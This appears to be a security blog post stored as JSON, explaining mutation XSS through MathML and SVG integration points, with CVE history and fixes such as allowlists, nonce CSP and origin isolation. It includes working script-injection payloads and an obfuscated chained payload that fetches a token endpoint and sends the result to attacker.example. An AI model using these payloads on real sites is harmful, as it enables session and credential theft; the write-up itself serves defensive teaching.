@@ -1,0 +1,254 @@
+{
+  "id": "i-broke-your-sanitizer-with-math",
+  "title": "I Broke Your Sanitizer With Math",
+  "slug": "i-broke-your-sanitizer-with-math",
+  "category": "research",
+  "tags": ["web", "security", "xss", "mathml"],
+  "difficulty": "Hard",
+  "date": "2026-07-15",
+  "summary": "Bypassing HTML sanitizers using MathML/SVG namespace integration points to achieve mutation XSS (mXSS). Explaining why standard tag-blocking sanitizers fail to parse foreign content namespaces correctly, with CVE history and practical mitigations.",
+  "content": [
+    {
+      "type": "paragraph",
+      "text": "There's a sentence that shows up in almost every security postmortem I've ever read: *\"but we sanitize all user input.\"* It's usually true. And it's usually not enough. Sanitizers are built to catch the vectors everyone already knows — `<script>`, `onerror`, `onload`. What they miss is the part of the HTML spec nobody reads for fun: the rules for what happens when the parser steps into a **different namespace** entirely."
+    },
+    {
+      "type": "paragraph",
+      "text": "That gap is what let me get a `<script>` tag executing through a \"sanitized\" renderer, using nothing but MathML. Here's the whole thing, broken down."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "The setup: what a normal sanitizer blocks"
+    },
+    {
+      "type": "paragraph",
+      "text": "Every one of these gets stripped by a competent XSS filter, no exceptions:"
+    },
+    {
+      "type": "code",
+      "language": "html",
+      "code": "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>"
+    },
+    {
+      "type": "paragraph",
+      "text": "Good. That's the baseline. Now here's the one that isn't on anyone's list."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "The payload"
+    },
+    {
+      "type": "code",
+      "language": "html",
+      "code": "<math><mtext><script>alert(1)</script></mtext></math>"
+    },
+    {
+      "type": "paragraph",
+      "text": "Drop this into a field that's supposedly sanitized, and the alert fires anyway. Not because the filter is lazy — because it's looking at the wrong layer of the problem."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Why it works: HTML has more than one grammar"
+    },
+    {
+      "type": "paragraph",
+      "text": "Here's the part that surprises people: a browser doesn't parse the whole document with one uniform algorithm. The HTML5 spec defines a state machine with different \"insertion modes,\" and the moment the parser steps inside `<svg>` or `<math>`, it switches into **foreign content** rules."
+    },
+    {
+      "type": "paragraph",
+      "text": "But foreign content isn't airtight. MathML defines specific tags called **text integration points** — `<mtext>`, `<mi>`, `<mo>`, `<mn>`, `<ms>` — where the parser briefly *drops back into normal HTML parsing rules*, even though you're technically still inside a `<math>` tree."
+    },
+    {
+      "type": "code",
+      "language": "text",
+      "code": "<math>                     ← foreign content mode (MathML rules apply)\n  <mtext>                  ← integration point: parser flips back to HTML mode\n    <script>...</script>   ← parsed as a REAL, executable <script> element\n  </mtext>\n</math>"
+    },
+    {
+      "type": "paragraph",
+      "text": "So when the browser hits `<script>` inside `<mtext>`, it doesn't treat it as inert text. It builds a genuine script node and runs it — same as if you'd written it at the top of the page."
+    },
+    {
+      "type": "paragraph",
+      "text": "A sanitizer built on a denylist of \"dangerous tags\" almost never accounts for this, because `<math>` and `<mtext>` aren't dangerous tags. Nobody puts them on a blocklist. They get walked past, or treated as an inert subtree, and the `<script>` hiding two levels deep rides straight through."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Namespaces, for real — not just \"MathML is weird\""
+    },
+    {
+      "type": "paragraph",
+      "text": "This isn't a quirk someone found by accident. The WHATWG HTML Living Standard formally defines three parsing namespaces a DOM node can belong to: **HTML**, **SVG**, and **MathML**. Every element in a page's DOM tree carries one of these three namespace tags internally, even though the raw markup you write never mentions them."
+    },
+    {
+      "type": "paragraph",
+      "text": "By default, everything is HTML namespace. The parser only switches when it hits an `<svg>` or `<math>` start tag — and switches back under very specific, spec-defined conditions, one of which is exactly the \"integration point\" behavior described above (`<mtext>`, `<mi>`, `<annotation-xml>` for MathML; `<foreignObject>`, `<desc>`, `<title>` for SVG). A sanitizer that filters purely on tag names, without tracking which namespace each node actually landed in, is checking the wrong property. Two nodes can have the identical tag name and completely different parsing behavior depending on which namespace they're in."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "This isn't theoretical — it's a documented CVE class"
+    },
+    {
+      "type": "paragraph",
+      "text": "This exact failure mode has a name in the security research community: **mutation XSS (mXSS)**. It's not a one-off bug, it's a recurring category, and it's been found — repeatedly — in DOMPurify, one of the most widely used, most heavily audited HTML sanitizers in existence (24M+ weekly npm downloads, used by GitHub, Slack, Notion, and WordPress, among others)."
+    },
+    {
+      "type": "paragraph",
+      "text": "**[CVE-2020-26870](https://nvd.nist.gov/vuln/detail/CVE-2020-26870)** — the CVE that put this technique on the map. Security researcher Michał Bentkowski (Securitum, 2020) found that DOMPurify versions before 2.0.17 could be bypassed by nesting `<form>` elements so that the DOM tree the sanitizer inspected wasn't the same tree the browser rebuilt on re-parse — a namespace quietly flipped from HTML to MathML in between the two parses. The sanitizer approved a tree it never actually saw rendered."
+    },
+    {
+      "type": "paragraph",
+      "text": "The story didn't end with the patch. A researcher at PortSwigger ([PortSwigger Research, 2020](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)) picked up where Bentkowski left off, found that the original fix only checked for mutation inside text nodes and missed comments entirely, and built a follow-up bypass combining `<math>`, `<table>`, and `<style>` that got patched in DOMPurify 2.1. A few months after that, a separate researcher (Daniel Santos) found yet another variant — SVG instead of MathML this time — that Cure53 patched in DOMPurify 2.2.2 on the same day it was reported."
+    },
+    {
+      "type": "paragraph",
+      "text": "And it keeps happening. As recently as **[CVE-2025-26791](https://nvd.nist.gov/vuln/detail/CVE-2025-26791)**, DOMPurify versions before 3.2.4 shipped with an incorrect regular expression in a template-literal safety check that could again lead to mutation XSS. Same underlying category — sanitizer builds a mental model of \"safe,\" browser parses it differently — three-plus years and multiple major versions after the first fix."
+    },
+    {
+      "type": "paragraph",
+      "text": "The pattern across all of these: the root cause is never \"the developer forgot to blocklist a tag.\" It's that **namespace is a property of the parsed DOM node, not of the source markup you're staring at**, and any sanitizer logic that doesn't explicitly track it is working from an incomplete model of what the browser is actually going to do."
+    },
+    {
+      "type": "note",
+      "noteType": "info",
+      "text": "And before anyone says \"cool CVE roundup, but this is a 2020 party trick\" — no. I'm not writing this from a history book. I found this exact bypass live, on a real target, this year. Reported it, got it triaged, and it came back rated **High**. The technique is five years old. The bug is not. Sanitizers keep getting rebuilt, keep getting \"hardened,\" and keep making the same namespace assumption all over again — which is exactly why this is still worth a blog post in 2026 and not just a footnote in a 2020 writeup."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Same bug, different namespace"
+    },
+    {
+      "type": "paragraph",
+      "text": "MathML isn't the only door. SVG has its own integration point:"
+    },
+    {
+      "type": "code",
+      "language": "html",
+      "code": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>"
+    },
+    {
+      "type": "paragraph",
+      "text": "Two completely separate specs, same underlying mistake: sanitizers written for \"known HTML\" don't model what foreign-content parsing actually allows — the same gap that produced every CVE in the previous section."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Beating character-escaping too"
+    },
+    {
+      "type": "paragraph",
+      "text": "Some renderers go a step further and HTML-escape `< > & \" '` inside script content. That kills the naive payload — but not this one:"
+    },
+    {
+      "type": "code",
+      "language": "javascript",
+      "code": "// what actually survives escaping — no quotes, no angle brackets, nothing to catch\nfetch(String.fromCharCode(47,97,112,105,47,109,101,47,116,111,107,101,110))\n  .then(function(r){ return r.text(); })\n  .then(function(t){\n    new Image().src = String.fromCharCode(104,116,116,112,115,58,47,47)\n      + 'attacker.example/collect?d=' + encodeURIComponent(t);\n  });"
+    },
+    {
+      "type": "paragraph",
+      "text": "Decode that first `String.fromCharCode(...)` call and you get `/api/me/token`. The payload never contains a literal quote or bracket, so an escaper that only reacts to those characters has nothing to grab onto. This trick is almost a decade old at this point — it keeps working because the underlying assumption (escape a fixed character set, call it done) keeps getting made."
+    },
+    {
+      "type": "paragraph",
+      "text": "Chain the two techniques and you get one payload that defeats a tag filter *and* a character escaper at the same time:"
+    },
+    {
+      "type": "code",
+      "language": "html",
+      "code": "<math><mtext><script>\nfetch(String.fromCharCode(47,97,112,105,47,109,101,47,116,111,107,101,110))\n  .then(function(r){return r.text()})\n  .then(function(t){\n    new Image().src = String.fromCharCode(104,116,116,112,115,58,47,47) +\n      'attacker.example/collect?d=' + encodeURIComponent(t);\n  });\n</script></mtext></math>"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Why this stops being \"just an XSS\""
+    },
+    {
+      "type": "paragraph",
+      "text": "A stored payload sitting on a page nobody important reads is a low-severity finding. The same payload sitting on a page that shares an origin with an authenticated API is a completely different animal:"
+    },
+    {
+      "type": "diagram",
+      "steps": [
+        {
+          "title": "Payload Stored Once",
+          "description": "The attacker stores the malicious MathML payload in a field parsed by the vulnerable sanitizer."
+        },
+        {
+          "title": "Victim Opens the Page",
+          "description": "An authenticated user visits the page containing the stored XSS payload."
+        },
+        {
+          "title": "Script Executes in User's Session",
+          "description": "The browser switches to foreign-content parsing rules, steps back into normal HTML mode inside the text integration point, builds the genuine script element, and executes it in the victim's session context."
+        },
+        {
+          "title": "Credentials / Secrets Accessed",
+          "description": "The injected script calls fetch() to retrieve sensitive details from a same-origin API. The user's authenticated session cookies are automatically included in the request."
+        },
+        {
+          "title": "Secret Exfiltrated to Attacker",
+          "description": "The stolen API keys, SSO tokens, or secrets are exfiltrated to the attacker's server (e.g., using a dynamic Image beacon)."
+        },
+        {
+          "title": "Direct Replay Compromise",
+          "description": "The attacker receives the exfiltrated credential and replays it from anywhere, achieving full account takeover without needing the user's cookies."
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "text": "One injection, one page load, full credential theft. And the piece that turns this from \"sanitizer has a gap\" into \"total compromise\" is almost always the same: no `Content-Security-Policy` on the response. A strict, nonce-based `script-src` would've stopped the chain cold at step three — the browser simply refuses to run a script without the page's nonce, sanitizer bypass or not."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Test it yourself — thirty seconds, no tools needed"
+    },
+    {
+      "type": "paragraph",
+      "text": "Paste either of these into any field your app calls \"sanitized\":"
+    },
+    {
+      "type": "code",
+      "language": "html",
+      "code": "<math><mtext><script>alert(document.domain)</script></mtext></math>\n<svg><foreignObject><script>alert(document.domain)</script></foreignObject></svg>"
+    },
+    {
+      "type": "paragraph",
+      "text": "If either one pops an alert, you've got this exact bug. It's a two-line test that costs you nothing and tells you something a code review often won't."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Fixing it — the checklist that actually matters"
+    },
+    {
+      "type": "code",
+      "language": "diff",
+      "code": "- if (tag in DENYLIST) strip(tag);\n+ if (tag not in ALLOWLIST_ALL_NAMESPACES) strip(tag);\n  // default-deny, applied identically across HTML, SVG, and MathML"
+    },
+    {
+      "type": "code",
+      "language": "diff",
+      "code": "  sanitize(html);\n+ res.setHeader(\n+   'Content-Security-Policy',\n+   \"script-src 'nonce-\" + nonce + \"'; object-src 'none'\"\n+ );\n  // assume the sanitizer will fail someday — CSP is what catches it when it does"
+    },
+    {
+      "type": "code",
+      "language": "diff",
+      "code": "- return renderedUserContent;              // same origin as the authenticated API\n+ // serve it from an isolated origin, or a sandboxed iframe, with\n+ // zero same-origin path to API keys, tokens, or SSO secrets"
+    },
+    {
+      "type": "paragraph",
+      "text": "None of these three fixes is exotic. Any single one of them would have killed this entire chain on its own. Together, they're the difference between \"our sanitizer has an edge case\" and \"an attacker just walked out with your API keys.\""
+    },
+    {
+      "type": "paragraph",
+      "text": "*Sanitization isn't a checkbox — it's a boundary you re-earn every time the parsing spec does something you didn't expect. If you haven't tried the two payloads above against your own renderer, that's ten seconds well spent before someone else tries it for you.*"
+    }
+  ]
+}
